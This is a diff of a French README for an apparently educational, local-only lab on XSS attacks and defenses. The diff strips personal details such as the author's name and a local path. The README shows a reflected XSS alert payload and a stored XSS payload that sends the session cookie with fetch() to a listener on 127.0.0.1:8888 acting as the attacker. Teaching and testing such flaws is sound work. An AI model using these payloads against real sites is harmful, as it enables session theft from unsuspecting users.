@@ -1,7 +1,6 @@
 # ⚡ TP Pédagogique : Les Failles XSS (Cross-Site Scripting) & Défenses
 
-> **Projet de TP et Démonstration - Master Ingénierie Informatique (Cybersécurité CEH)**  
-> **Auteur** : Ayoub  
+> **Laboratoire Pratique de Cybersécurité Web**  
 > **Avertissement** : Environnement strictement local et contrôlé à vocation pédagogique.
 
 ---
@@ -46,7 +45,7 @@ xss-tp/
 
 Placez-vous dans le dossier :
 ```cmd
-cd "c:\Users\DELL\Documents\Master\Master_M2I\SEMESTRE 3\Cybersécurité CEH\TPs\Exposé - CSRF Attack\xss-tp"
+cd "xss-tp"
 ```
 
 ### Étape A : Lancer le scénario vulnérable
@@ -63,13 +62,13 @@ Deux fenêtres s'ouvrent :
    <script>alert('Faille XSS Réfléchi détectée !')</script>
    ```
 2. **XSS Stocké & Vol de Session** :
-   - Connectez-vous sur `http://127.0.0.1:5000/login` (`Ayoub` / `password123`).
+   - Connectez-vous sur `http://127.0.0.1:5000/login` (identifiants de test : `user` / `password123`).
    - Allez sur le livre d'or `http://127.0.0.1:5000/guestbook`.
    - Postez ce message malveillant :
    ```html
    <script>fetch('http://127.0.0.1:8888/?cookie=' + encodeURIComponent(document.cookie));</script>
    ```
-   - Observez le terminal du port 8888 : **le cookie de session d'Ayoub s'affiche en clair chez le pirate !**
+   - Observez le terminal du port 8888 : **le cookie de session s'affiche en clair chez le pirate !**
 
 ---
 
@@ -93,4 +92,3 @@ Pour valider l'ensemble des scénarios de manière industrielle :
 python tests/test_xss.py
 ```
 Résultat : **5/5 tests validés avec succès** !
-
